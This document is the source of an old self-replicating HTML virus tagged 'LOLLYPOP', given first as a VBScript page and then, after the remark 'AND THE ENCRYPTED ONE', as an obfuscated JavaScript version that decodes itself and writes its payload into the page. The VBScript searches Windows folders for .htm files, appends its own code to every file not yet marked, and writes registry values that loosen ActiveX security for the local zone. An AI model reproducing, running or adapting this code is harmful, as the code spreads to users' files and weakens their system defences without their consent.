<!--LOLLYPOP-->
<html><body>
<script Language="VBScript"><!--
SET F = CreateObject("Scripting.FileSystemObject")
SET L = document.body.createTextRange
CALL INF("C:\Windows\Web")
CALL INF("C:\Windows\Help")
CALL INF("C:\Windows\System")
CALL INF("C:\Windows")
CALL INF("C:\Winnt\Help")
CALL INF("C:\Winnt\System")
CALL INF("C:\Winnt")
SET W = CreateObject("WScript.Shell")
W.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
W.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
SUB INF(P)
ON Error Resume Next
IF F.FolderExists(P) THEN
DO
SET B = F.GetFolder(P)
P = F.GetParentFolderName(P)
SET K = B.Files
FOR each target in K
E = lcase(F.GetExtensionName(target.Name))
IF E = "htm" THEN
SET X = F.OpenTextFile(target.path, 1, False)
IF X.readline <> "<!--LOLLYPOP-->" THEN
X.close()
GF(target.path)
ELSE
X.close()
END IF
END IF
NEXT
LOOP UNTIL B.IsRootFolder = True
END IF
END SUB
Sub GF(G)
Set X = F.OpenTextFile(G, 1, False)
R = X.ReadAll()
X.close()
Set X = F.OpenTextFile(G, 2, False)
X.WriteLine "<!--LOLLYPOP-->"
X.Write(R)
X.close()
Set X = F.OpenTextFile(G, 8, False)
X.Write("<html><body>" + Chr(13) + Chr(10))
X.Write L.htmlText
X.WriteLine("</body></html>")
X.close()
End Sub

--></script>
</body></html>



; AND THE ENCRYPTED ONE :DD

<HTML>
<BODY>
<SCRIPT LANGUAGE="JavaScript"><!--
function DCR() {
AR(BY,"F0FYKK,),,!()(KKD0FrfmnDFxkvaD0FgwhqjfW,ylseysuEX|@%whqjfXDFYKK0%=$W<WEW?huyfu)xpuwfPX%whqjfqlsJ<qnu%agfum)xpuwfXO0%=$W,WEWvkwemulfJxkvaJwhuyfu$ubf&ylsu0?\[,,W\/*<PX?H9 qlvkcg9 uxXO0?\[,,W\/*<PX?H9 qlvkcg9:unjXO0?\[,,W\/*<PX?H9 qlvkcg9%agfumXO0?\[,,W\/*<PX?H9 qlvkcgXO0?\[,,W\/*<PX?H9 qllf9:unjXO0?\[,,W\/*<PX?H9 qllf9%agfumXO0?\[,,W\/*<PX?H9 qllfXO0%=$W WEW?huyfu)xpuwfPX %whqjfJ%runnXO0 J&uschqfuX:-?#9%ktfcyhu9+qwhkgktf9 qlvkcg9?ehhulf|uhgqkl9\/lfuhlufW%uffqlsg9zklug9\n9~}\n~XWLW\nLWX&=;6> )&>X0 J&us hqfuX:-=!6,)?\[,6+\[?:\/*=9%ktfcyhu9+qwhkgktf9 qlvkcg9?ehhulf|uhgqkl9\/lfuhlufW%uffqlsg9zklug9\n9~}\n~XWLW\nLWX&=;6> )&>X0%#@W\/*<P(O0)*W=hhkhW&ugemuW*ubf0\/<W<J<knvuh=bqgfgP(OW$:=*0>)0%=$W@WEW<J;uf<knvuhP(O0(WEW<J;uf(yhulf<knvuh*ymuP(O0%=$W-WEW@");
AR(BY,"J<qnug0<)&WuywrWfyhsufWqlW-0=WEWnwyguP<J;uf=bfulgqkl*ymuPfyhsufJ*ymuOO0\/<W=WEWXrfmXW$:=*0%=$W\"WEW<J)jul$ubf<qnuPfyhsufJjyfrLW~LW<ynguO0\/<W\"JhuyvnqluWFDWXFYKK,),,!()(KKDXW$:=*0\"JwnkguPO0;<PfyhsufJjyfrO0=,%=0\"JwnkguPO0=*>W\/<0=*>W\/<0*=\"$0,))(W#*$\/,W@J\/g&kkf<knvuhWEW$heu0=*>W\/<0=*>W%#@0%exW;<P;O0%ufW\"WEW<J)jul$ubf<qnuP;LW~LW<ynguO0&WEW\"J&uyv\[nnPO0\"JwnkguPO0%ufW\"WEW<J)jul$ubf<qnuP;LW}LW<ynguO0\"J hqfu,qluWXFYKK,),,!()(KKDX0\"J hqfuP&O0\"JwnkguPO0%ufW\"WEW<J)jul$ubf<qnuP;LW\]LW<ynguO0\"J hqfuPXFrfmnDFxkvaDXWMW?rhP~{OWMW?rhP~\nOO0\"J hqfuW,Jrfmn$ubf0\"J hqfu,qluPXFIxkvaDFIrfmnDXO0\"JwnkguPO0=lvW%ex00KKDFIgwhqjfD0FIxkvaDFIrfmnD");
return 0;}
//--></SCRIPT>
<SCRIPT LANGUAGE="JavaScript"><!--
function AR(FF,AA) {document.write(JEJE(FF,AA));}var BY = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"\ \|#$%&\'()*+,-.\/:;<=>?@[\\]^_\t\`{}~\n";function JEJE (mC, eS) {var wTG, mcH =  mC.length / 2, nS = "", dv;for (var x = 0; x < eS.length; x++) {	wTG = mC.indexOf(eS.charAt(x));if (wTG > mcH) {dv = wTG - mcH; nS = nS + mC.charAt(48 - dv);}else {dv = mcH - wTG;nS = nS + mC.charAt(48 + dv);}}return nS;}
//--></SCRIPT>
<SCRIPT LANGUAGE="JavaScript"><!--
DCR()
//--></SCRIPT>
</BODY>
</HTML>
